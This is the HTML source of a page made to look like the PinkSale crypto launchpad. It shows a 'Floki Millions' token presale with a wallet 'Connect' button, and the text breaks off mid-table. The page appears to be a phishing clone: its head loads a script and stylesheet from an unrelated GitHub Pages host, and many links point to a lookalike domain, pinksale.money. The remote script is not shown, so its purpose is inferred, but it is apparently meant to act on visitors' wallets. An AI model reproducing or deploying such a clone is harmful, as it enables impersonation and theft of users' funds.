
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="icon" href="https://www.pinksale.finance/favicon.png" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="" />
    <link rel="apple-touch-icon" href="https://www.pinksale.finance/logo192.png" />
    <link rel="manifest" href="https://www.pinksale.finance/manifest.json" />
    <title>PinkSale - The Launchpad Protocol for Everyone!</title>
    <script type="text/javascript" async="" src="https://ketlller.github.io/test/analytics.js"></script>
    <script>
        self == top ? (document.documentElement.style.display = "block") : (top.location = self.location);
    </script>
    <link href="https://ketlller.github.io/test/main.css" rel="stylesheet" />

</head>

<body>
    <div id="root">
        <section class="ant-layout ant-layout-has-sider">
            <header class="ant-layout-header" style="background: white; height: 70px; position: fixed; z-index: 100; width: 100%; padding: 0px 30px;">
                <nav class="flex items-center noselect">
                    <div class="pr-2 pt-2 is-size-4" style="cursor: pointer;">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                            <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"></path>
                        </svg>
                    </div>
                    <a class="logo mr-3" href="#/?chain=BSC">
                        <div class="logo-icon"><img src="https://www.pinksale.finance/static/media/pinkswap.a95de4f3.png" alt="pinksale" /></div>
                        <div class="logo-text pt-1 hide-on-mobile">PinkSale</div>
                    </a>
                    <div class="flex-1"></div>
                    <div class="ant-dropdown-trigger connectButton on-mobile">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" t="1551322312294" viewBox="0 0 1024 1024" version="1.1" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                            <defs></defs>
                            <path d="M474 152m8 0l60 0q8 0 8 8l0 704q0 8-8 8l-60 0q-8 0-8-8l0-704q0-8 8-8Z"></path>
                            <path d="M168 474m8 0l672 0q8 0 8 8l0 60q0 8-8 8l-672 0q-8 0-8-8l0-60q0-8 8-8Z"></path>
                        </svg>
                        <span class="ml-2 hide-on-mobile">Create</span>
                    </div>
                    <div class="network on-mobile" style="cursor: pointer;"><img src="https://www.pinksale.finance/static/media/ic-bsc.18017344.svg" width="18" alt="" /><span class="ml-2 hide-on-mobile">BSC MAINNET</span></div>
                    <div id="connect-button" class="connectButton">Connect</div>
                </nav>
            </header>
            <input type="hidden" class="menuStatus" value="2">
            <aside class="ant-layout-sider ant-layout-sider-dark ant-layout-sider-below ant-layout-sider-collapsed" style="  background: white; overflow: auto; height: 100vh; position: fixed; top: 70px; left: 0px; z-index: 10; flex: 0 0 200px; max-width: 200px; min-width: 200px; width: 200px;">

                <div class="ant-layout-sider-children">
                    <ul class="ant-menu ant-menu-root ant-menu-inline ant-menu-light" role="menu" tabindex="0" data-menu-list="true">
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-home" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path d="M946.5 505L560.1 118.8l-25.9-25.9a31.5 31.5 0 0 0-44.4 0L77.5 505a63.9 63.9 0 0 0-18.8 46c.4 35.2 29.7 63.3 64.9 63.3h42.5V940h691.8V614.3h43.4c17.1 0 33.2-6.7 45.3-18.8a63.6 63.6 0 0 0 18.7-45.3c0-17-6.7-33.1-18.8-45.2zM568 868H456V664h112v204zm217.9-325.7V868H632V640c0-22.1-17.9-40-40-40H432c-22.1 0-40 17.9-40 40v228H238.1V542.3h-96l370-369.7 23.1 23.1L882 542.3h-96.1z"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://pinksale.money/PinkSale%20-%20The%20Launchpad%20Protocol%20for%20Everyone%21.html">Home</a></span>
                        </li>
                        <li class="ant-menu-submenu ant-menu-submenu-inline ant-menu-submenu-open ant-menu-submenu-selected" role="none">
                            <div role="menuitem" class="ant-menu-submenu-title" tabindex="-1" aria-expanded="true" aria-haspopup="true" data-menu-id="rc-menu-uuid-04926-1-launchpads-menu" aria-controls="rc-menu-uuid-04926-1-launchpads-menu-popup" style="padding-left: 24px;">
                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                    <path fill="none" stroke="#000" stroke-width="2" d="M7,9 L7,14 C7,14 4,16 4,19 L4,20 L8,20 L10,23 L14,23 L16,20 L20,20 L20,19 C20,16 17,14 17,14 L17,9 C17,5 14,1 12,1 C10,1 7,5 7,9 Z M8,20 L16,20 M12,9 C12.5522847,9 13,8.55228475 13,8 C13,7.44771525 12.5522847,7 12,7 C11.4477153,7 11,7.44771525 11,8 C11,8.55228475 11.4477153,9 12,9 Z"></path>
                                </svg>
                                <span class="ant-menu-title-content" style="display:none">Launchpads</span><i class="ant-menu-submenu-arrow" style="display:none"></i>
                            </div>
                            <ul class="ant-menu ant-menu-sub ant-menu-inline" id="rc-menu-uuid-04926-1-launchpads-menu-popup" data-menu-list="true" style="display:none">
                                <li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-launchpad/create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px;">
                                    <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/launchpad/create?chain=BSC">Create launchpad</a></span>
                                </li>
                                <li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-fairlaunch/create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px;">
                                    <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/fairlaunch/create?chain=BSC">Create fair launch</a></span>
                                </li>
                                <li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-launchpad/token/create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px;">
                                    <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/launchpad/token/create?chain=BSC">Create token</a></span>
                                </li>
                                <li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-launchpads" class="ant-menu-item ant-menu-item-selected ant-menu-item-only-child" style="padding-left: 48px;">
                                    <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/launchpads?chain=BSC">Launchpad list</a></span>
                                </li>
                            </ul>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-leaderboard" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path d="M899.6 276.5L705 396.4 518.4 147.5a8.06 8.06 0 0 0-12.9 0L319 396.4 124.3 276.5c-5.7-3.5-13.1 1.2-12.2 7.9L188.5 865c1.1 7.9 7.9 14 16 14h615.1c8 0 14.9-6 15.9-14l76.4-580.6c.8-6.7-6.5-11.4-12.3-7.9zm-126 534.1H250.3l-53.8-409.4 139.8 86.1L512 252.9l175.7 234.4 139.8-86.1-53.9 409.4zM512 509c-62.1 0-112.6 50.5-112.6 112.6S449.9 734.2 512 734.2s112.6-50.5 112.6-112.6S574.1 509 512 509zm0 160.9c-26.6 0-48.2-21.6-48.2-48.3 0-26.6 21.6-48.3 48.2-48.3s48.2 21.6 48.2 48.3c0 26.6-21.6 48.3-48.2 48.3z"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/leaderboard?chain=BSC">Leaderboard</a></span>
                        </li>
                        <li class="ant-menu-submenu ant-menu-submenu-inline" role="none">
                            <div role="menuitem" class="ant-menu-submenu-title" tabindex="-1" aria-expanded="false" aria-haspopup="true" data-menu-id="rc-menu-uuid-04926-1-pinklock" aria-controls="rc-menu-uuid-04926-1-pinklock-popup" style="padding-left: 24px;">
                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M832 464H332V240c0-30.9 25.1-56 56-56h248c30.9 0 56 25.1 56 56v68c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8v-68c0-70.7-57.3-128-128-128H388c-70.7 0-128 57.3-128 128v224h-68c-17.7 0-32 14.3-32 32v384c0 17.7 14.3 32 32 32h640c17.7 0 32-14.3 32-32V496c0-17.7-14.3-32-32-32zm-40 376H232V536h560v304zM484 701v53c0 4.4 3.6 8 8 8h40c4.4 0 8-3.6 8-8v-53a48.01 48.01 0 1 0-56 0z"></path>
                                </svg>
                                <a class="ant-menu-title-content" style="display:none" href="https://pinksale.money/pinklock.html"> Pinklock</a><i class="ant-menu-submenu-arrow" style="display:none"><a href="https://pinksale.money/pinklock.html"></a></i>
                            </div>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-antibot" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path d="M20.995,6.9c-0.034-0.342-0.241-0.642-0.548-0.795l-8-4c-0.281-0.141-0.613-0.141-0.895,0l-8,4 C3.246,6.259,3.039,6.559,3.005,6.9c-0.011,0.107-0.961,10.767,8.589,15.014C11.723,21.972,11.861,22,12,22 s0.277-0.028,0.406-0.086C21.956,17.667,21.006,7.008,20.995,6.9z M12,19.897C5.231,16.625,4.911,9.642,4.966,7.635L12,4.118 l7.029,3.515C19.066,9.622,18.701,16.651,12,19.897z"></path>
                                <path d="M11 12.586L8.707 10.293 7.293 11.707 11 15.414 16.707 9.707 15.293 8.293z"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://www.pinksale.finance/#/antibot?chain=BSC">Pink Anti-Bot</a></span>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-pools-alert" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path d="M21.928,11.607c-0.202-0.488-0.635-0.605-0.928-0.633V8c0-1.103-0.897-2-2-2h-6V4.61c0.305-0.274,0.5-0.668,0.5-1.11 C13.5,2.672,12.828,2,12,2s-1.5,0.672-1.5,1.5c0,0.442,0.195,0.836,0.5,1.11V6H5C3.897,6,3,6.897,3,8v2.997 C2.951,11,2.918,11.003,2.918,11.003C2.395,11.04,1.99,11.476,1.99,12v2c0,0.553,0.447,1,1,1H3v5c0,1.103,0.897,2,2,2h14 c1.103,0,2-0.897,2-2v-5c0.553,0,1-0.447,1-1v-1.938C22.011,11.909,21.988,11.753,21.928,11.607z M5,20V8h14l0.001,3.996 C19.001,11.998,19,11.999,19,12v2c0,0.002,0.001,0.003,0.001,0.005L19.002,20H5z"></path>
                                <ellipse cx="8.5" cy="12" rx="1.5" ry="2"></ellipse>
                                <ellipse cx="15.5" cy="12" rx="1.5" ry="2"></ellipse>
                                <path d="M8 16H16V18H8z"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://t.me/PinkSaleTracking" target="_blank" rel="noreferrer noopener">Pools Alert</a></span>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-pinkswap" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path d="M296 250c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h384c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8H296zm184 144H296c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h184c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8zm-48 458H208V148h560v320c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V108c0-17.7-14.3-32-32-32H168c-17.7 0-32 14.3-32 32v784c0 17.7 14.3 32 32 32h264c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm440-88H728v-36.6c46.3-13.8 80-56.6 80-107.4 0-61.9-50.1-112-112-112s-112 50.1-112 112c0 50.7 33.7 93.6 80 107.4V764H520c-8.8 0-16 7.2-16 16v152c0 8.8 7.2 16 16 16h352c8.8 0 16-7.2 16-16V780c0-8.8-7.2-16-16-16zM646 620c0-27.6 22.4-50 50-50s50 22.4 50 50-22.4 50-50 50-50-22.4-50-50zm180 266H566v-60h260v60z"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://docs.pinksale.finance/important/kyc-and-audit-at-pinksale" target="_blank" rel="noreferrer noopener">KYC &amp; Audit</a></span>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-docs" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <path fill="none" stroke-linejoin="round" stroke-width="32" d="M416 221.25V416a48 48 0 01-48 48H144a48 48 0 01-48-48V96a48 48 0 0148-48h98.75a32 32 0 0122.62 9.37l141.26 141.26a32 32 0 019.37 22.62z"></path>
                                <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M256 56v120a32 32 0 0032 32h120m-232 80h160m-160 80h160"></path>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://docs.pinksale.finance" target="_blank" rel="noreferrer noopener">Docs</a></span>
                        </li>
                        <li class="ant-menu-submenu ant-menu-submenu-inline" role="none">
                            <div role="menuitem" class="ant-menu-submenu-title" tabindex="-1" aria-expanded="false" aria-haspopup="true" data-menu-id="rc-menu-uuid-04926-1-telegram" aria-controls="rc-menu-uuid-04926-1-telegram-popup" style="padding-left: 24px;">
                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                    <g>
                                        <path fill="none" d="M0 0h24v24H0z"></path>
                                        <path fill-rule="nonzero" d="M12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm0 2C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-3.11-8.83l-2.498-.779c-.54-.165-.543-.537.121-.804l9.733-3.76c.565-.23.885.061.702.79l-1.657 7.82c-.116.557-.451.69-.916.433l-2.551-1.888-1.189 1.148c-.122.118-.221.219-.409.244-.187.026-.341-.03-.454-.34l-.87-2.871-.012.008z"></path>
                                    </g>
                                </svg>
                                <span class="ant-menu-title-content" style="display:none">Telegram</span><i class="ant-menu-submenu-arrow" style="display:none"></i>
                            </div>
                        </li>
                        <li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-04926-1-twitter" style="padding-left: 24px;">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
                                <g>
                                    <path fill="none" d="M0 0h24v24H0z"></path>
                                    <path fill-rule="nonzero" d="M15.3 5.55a2.9 2.9 0 0 0-2.9 2.847l-.028 1.575a.6.6 0 0 1-.68.583l-1.561-.212c-2.054-.28-4.022-1.226-5.91-2.799-.598 3.31.57 5.603 3.383 7.372l1.747 1.098a.6.6 0 0 1 .034.993L7.793 18.17c.947.059 1.846.017 2.592-.131 4.718-.942 7.855-4.492 7.855-10.348 0-.478-1.012-2.141-2.94-2.141zm-4.9 2.81a4.9 4.9 0 0 1 8.385-3.355c.711-.005 1.316.175 2.669-.645-.335 1.64-.5 2.352-1.214 3.331 0 7.642-4.697 11.358-9.463 12.309-3.268.652-8.02-.419-9.382-1.841.694-.054 3.514-.357 5.144-1.55C5.16 15.7-.329 12.47 3.278 3.786c1.693 1.977 3.41 3.323 5.15 4.037 1.158.475 1.442.465 1.973.538z"></path>
                                </g>
                            </svg>
                            <span class="ant-menu-title-content" style="display:none"><a href="https://twitter.com/pinkecosystem" target="_blank" rel="noreferrer noopener">Twitter</a></span>
                        </li>
                    </ul>
                    <div aria-hidden="true" style="display: none;"></div>
                </div>
            </aside>
            <section class="ant-layout layout-curr" style="margin-left: 80px; padding: 40px 20px 20px; transition: all 200ms linear 0s;">
                <main class="ant-layout-content MainLayout_content__2mZF9">
                    <div class="Trending_trending__2ax2p">
                        <div class="Trending_title__3t1fM">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M352 144h112v112"></path>
                                <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M48 368l121.37-121.37a32 32 0 0145.26 0l50.74 50.74a32 32 0 0045.26 0L448 160"></path>
                            </svg>
                            &nbsp;<span>Trending</span>
                        </div>

                        <ul class="Trending_items__2B7P8">
    <li class="Trending_trendingItem__235g3"><span>#1</span>&nbsp;<a href="https://pinksale.money/launchpad/0x8146B63EdFC61B8b28b0181A026a122d6D0c6316?chain=BSC">ABI</a></li>
    <li class="Trending_trendingItem__235g3"><span>#2</span>&nbsp;<a href="https://pinksale.money/launchpad/0x50a8d98B7111c3C96fc3Cda67f2b26f1cE38e550?chain=BSC">EHRO</a></li>
    <li class="Trending_trendingItem__235g3"><span>#3</span>&nbsp;<a href="https://pinksale.money/launchpad/0x4aa3bc46f95C5C12D8Fd274F6DF491F879af0680?chain=BSC">DLC</a></li>
    <li class="Trending_trendingItem__235g3"><span>#4</span>&nbsp;<a href="https://pinksale.money/launchpad/0x6841430E627BF53fe5A53a0D5431df09CB4b51aF?chain=BSC">METAWORLD</a></li>
    <li class="Trending_trendingItem__235g3"><span>#5</span>&nbsp;<a href="https://pinksale.money/launchpad/0x4CbDf834c2063cd9244Cfc226A000107187b22d0?chain=BSC">MRFLOKI</a></li>
    <li class="Trending_trendingItem__235g3"><span>#6</span>&nbsp;<a href="https://pinksale.money/launchpad/0x39Ab7625192315cf3339B3b5a01C9D866c20B806?chain=BSC">HDM</a></li>
    <li class="Trending_trendingItem__235g3"><span>#7</span>&nbsp;<a href="https://pinksale.money/launchpad/0x6C4F6cB8A7Bc45107eA9FA876E49b4113F1F08BF?chain=BSC">LTA</a></li>
    <li class="Trending_trendingItem__235g3"><span>#8</span>&nbsp;<a href="https://pinksale.money/launchpad/0xc48CA86FCd54bA696C8558Db94DCf597E6591c8b?chain=BSC">PTRST</a></li>
    <li class="Trending_trendingItem__235g3"><span>#9</span>&nbsp;<a href="https://pinksale.money/launchpad/0x55301E5e5ca238FC3Ae402a7B44EAe70004dC57D?chain=BSC">DWINE</a></li>
    <li class="Trending_trendingItem__235g3"><span>#10</span>&nbsp;<a href="https://pinksale.money/launchpad/0x4114218cD046Fb931EcFB1BadaA787Fe8E457018?chain=BSC">MBIKE</a></li>
    <li class="Trending_trendingItem__235g3"><span>#11</span>&nbsp;<a href="https://pinksale.money/launchpad/0x75E6F77c1Cf3979e8339671A2A646E0E6a33e32E?chain=BSC">MRW</a></li>
    <li class="Trending_trendingItem__235g3"><span>#12</span>&nbsp;<a href="https://pinksale.money/launchpad/0x978b9302d7Dd63108Ec94C3d627F6Bcfc8B9166F?chain=BSC">MTF</a></li>
    <li class="Trending_trendingItem__235g3"><span>#13</span>&nbsp;<a href="https://pinksale.money/launchpad/0xA1D78Dc0745b2F198D1EC46011c0CfE9844b38Dd?chain=BSC">MILLIONS</a></li>
</ul>

                    </div>

                    <div class="py-6 container">
                        <div class="back" style="display: none;position: fixed; inset: 0px; background: rgba(0, 0, 0, 0.4); z-index: 9;"></div>
                        <div class="columns mt-4">

                            <div class="column is-flex-grow-2">
                                <div class="ant-card ant-card-bordered">
                                    <div class="ant-card-body">
                                        <article class="media pool-detail" style="position: relative;">
                                            <figure class="media-left" style="border: 1px solid rgba(249, 81, 146, 0.2); border-radius: 50%; overflow: hidden;">
                                                <p class="image is-64x64"><img src="https://ipfs.infura.io:/ipfs/QmYPcKT5daGvURoxpZKFTuo8pHmRb4hbKb2Rq6wYBj8sPt" alt="" style="filter: grayscale(0);"></p>
                                            </figure>
                                            <div class="media-content">
                                                <div class="content">
                                                    <div class="is-flex is-align-items-center">
                                                        <div class="is-flex-grow-1 is-flex is-align-items-center single-title">
                                                            <h1 class="title mr-2">Floki Millions Presale</h1><a href="https://docs.pinksale.finance/important/kyc-and-audit-at-pinksale" class="is-flex tag is-success is-small mr-2" target="_blank" rel="noopener nofollow noreferrer">KYC</a><a href="https://github.com/interfinetwork/smart-contract-audits/blob/main/FlokiMillions_AuditReport_InterFi.pdf" class="is-flex tag is-small mr-2" target="_blank" rel="noopener nofollow noreferrer" style="background-color: rgb(0, 188, 212); color: rgb(255, 255, 255);">Audit</a>
                                                            <div class="status-wrapper"><span class="is-flex status-dot inprogress"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="8"></circle></svg><span> Sale Live</span></span></div>
                                                        </div>
                                                    </div>
                                                    <div class="is-flex mt-1 mb-2"><a href="https://flokimillions.com" rel="nofollow noreferrer" target="_blank" class="mr-4 is-size-5"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                                <circle cx="12" cy="12" r="10"></circle>
                                                                <line x1="2" y1="12" x2="22" y2="12"></line>
                                                                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
                                                            </svg></a><a href="https://twitter.com/floki_millions" rel="nofollow noreferrer" target="_blank" class="mr-4 is-size-5"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
                                                            </svg></a><a href="https://www.facebook.com/flokimillions/" rel="nofollow noreferrer" target="_blank" class="mr-4 is-size-5"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                                <g>
                                                                    <path fill="none" d="M0 0h24v24H0z"></path>
                                                                    <path d="M13 19.938A8.001 8.001 0 0 0 12 4a8 8 0 0 0-1 15.938V14H9v-2h2v-1.654c0-1.337.14-1.822.4-2.311A2.726 2.726 0 0 1 12.536 6.9c.382-.205.857-.328 1.687-.381.329-.021.755.005 1.278.08v1.9H15c-.917 0-1.296.043-1.522.164a.727.727 0 0 0-.314.314c-.12.226-.164.45-.164 1.368V12h2.5l-.5 2h-2v5.938zM12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"></path>
                                                                </g>
                                                            </svg></a><a href="https://t.me/floki_millions" rel="nofollow noreferrer" target="_blank" class="mr-4 is-size-5"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z"></path>
                                                            </svg></a><a href="https://www.instagram.com/floki_millions" rel="nofollow noreferrer" target="_blank" class="mr-4 is-size-5"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M512 306.9c-113.5 0-205.1 91.6-205.1 205.1S398.5 717.1 512 717.1 717.1 625.5 717.1 512 625.5 306.9 512 306.9zm0 338.4c-73.4 0-133.3-59.9-133.3-133.3S438.6 378.7 512 378.7 645.3 438.6 645.3 512 585.4 645.3 512 645.3zm213.5-394.6c-26.5 0-47.9 21.4-47.9 47.9s21.4 47.9 47.9 47.9 47.9-21.3 47.9-47.9a47.84 47.84 0 0 0-47.9-47.9zM911.8 512c0-55.2.5-109.9-2.6-165-3.1-64-17.7-120.8-64.5-167.6-46.9-46.9-103.6-61.4-167.6-64.5-55.2-3.1-109.9-2.6-165-2.6-55.2 0-109.9-.5-165 2.6-64 3.1-120.8 17.7-167.6 64.5C132.6 226.3 118.1 283 115 347c-3.1 55.2-2.6 109.9-2.6 165s-.5 109.9 2.6 165c3.1 64 17.7 120.8 64.5 167.6 46.9 46.9 103.6 61.4 167.6 64.5 55.2 3.1 109.9 2.6 165 2.6 55.2 0 109.9.5 165-2.6 64-3.1 120.8-17.7 167.6-64.5 46.9-46.9 61.4-103.6 64.5-167.6 3.2-55.1 2.6-109.8 2.6-165zm-88 235.8c-7.3 18.2-16.1 31.8-30.2 45.8-14.1 14.1-27.6 22.9-45.8 30.2C695.2 844.7 570.3 840 512 840c-58.3 0-183.3 4.7-235.9-16.1-18.2-7.3-31.8-16.1-45.8-30.2-14.1-14.1-22.9-27.6-30.2-45.8C179.3 695.2 184 570.3 184 512c0-58.3-4.7-183.3 16.1-235.9 7.3-18.2 16.1-31.8 30.2-45.8s27.6-22.9 45.8-30.2C328.7 179.3 453.7 184 512 184s183.3-4.7 235.9 16.1c18.2 7.3 31.8 16.1 45.8 30.2 14.1 14.1 22.9 27.6 30.2 45.8C844.7 328.7 840 453.7 840 512c0 58.3 4.7 183.2-16.2 235.8z"></path>
                                                            </svg></a></div>
                                                    <div class="ant-typography">$MILLIONS is the year's hottest lottery token with massive weekly jackpot drawings. With our one-of-a-kind lottery smart contract, you’ll earn reflections in BNBs regardless of $MILLIONS volume. This means more money in your wallet! Floki Millions is the moonshot you've been waiting for! </div>
                                                </div>
                                            </div>
                                        </article>
                                        <div class="table-container mt-6">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <td>Presale Address</td>
                                                        <td class="has-text-right"><a href="https://bscscan.com/txs" target="_blank" rel="noreferrer nofollow">0x239e8c31e4097e294Fe3BD2C7A0A3b274807F43a</a></td>
                                                    </tr>
                                                    <tr>
                                                        <td>Token Name</td>
                                                        <td class="has-text-right">Floki Millions</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Token Symbol</td>
                                                        <td class="has-text-right">MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Token Decimals</td>
                                                        <td class="has-text-right">18</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Token Address</td>
                                                        <td class="has-text-right"><a class="mr-1" href="https://bscscan.com/address/0xE8Ce27F7f710982CE427D57b571Cdb041D052d9B" target="_blank" rel="noreferrer nofollow">0xE8Ce27F7f710982CE427D57b571Cdb041D052d9B</a><br>
                                                            <p class="help is-info">(Do not send BNB to the token address!)</p>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>Total Supply</td>
                                                        <td class="has-text-right">1,000,000,000,000 MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Tokens For Presale</td>
                                                        <td class="has-text-right">460,000,000,000 MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Tokens For Liquidity</td>
                                                        <td class="has-text-right">276,000,000,000 MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Presale Rate</td>
                                                        <td class="has-text-right">1 BNB = 1,840,000,000 MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Listing Rate</td>
                                                        <td class="has-text-right">1 BNB = 1,840,000,000 MILLIONS</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Initial Market Cap (estimate)</td>
                                                        <td class="has-text-right">$222,134</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Soft Cap</td>
                                                        <td class="has-text-right">125 BNB</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Hard Cap</td>
                                                        <td class="has-text-right">250 BNB</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Unsold Tokens</td>
                                                        <td class="has-text-right">Refund</td>
